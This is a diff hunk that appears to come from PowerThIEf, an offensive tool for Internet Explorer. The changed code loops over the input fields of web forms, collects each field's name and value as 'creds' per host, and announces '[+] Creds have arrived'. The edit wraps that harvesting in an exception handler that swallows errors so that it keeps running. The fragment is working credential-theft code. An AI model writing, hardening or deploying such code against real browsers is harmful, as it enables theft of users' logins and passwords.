@@ -889,18 +889,23 @@ Invoke-PowerThIEf -action NewBackgroundTab -BrowserIndex <BrowserIndex>
                                         bool bFound = false;
                                         foreach (mshtml.IHTMLElement input in formDoc.getElementsByTagName("input"))
                                         {
-                                            var value = input.getAttribute("value");
-                                            if (!String.IsNullOrWhiteSpace(value.ToString().Trim()))
-                                            {
-                                                var cred = input.getAttribute("name") + " : " + value;
-                                                if (!_credsFound[host].Contains(cred))
+                                            try {
+                                                var value = input.getAttribute("value");
+                                                if (!String.IsNullOrWhiteSpace(value.ToString().Trim()))
                                                 {
-                                                    _credsFound[host].Add(cred);
-                                                    if (!bFound)
-                                                        Console.WriteLine(String.Format("[+] Creds have arrived in from {0}", host));
-                                                    bFound = true;
+                                                    var cred = input.getAttribute("name") + " : " + value;
+                                                    if (!_credsFound[host].Contains(cred))
+                                                    {
+                                                        _credsFound[host].Add(cred);
+                                                        if (!bFound)
+                                                            Console.WriteLine(String.Format("[+] Creds have arrived in from {0}", host));
+                                                        bFound = true;
+                                                    }
                                                 }
                                             }
+                                            catch 
+                                            {
+                                            }    
                                         }
                                     }
                                 }
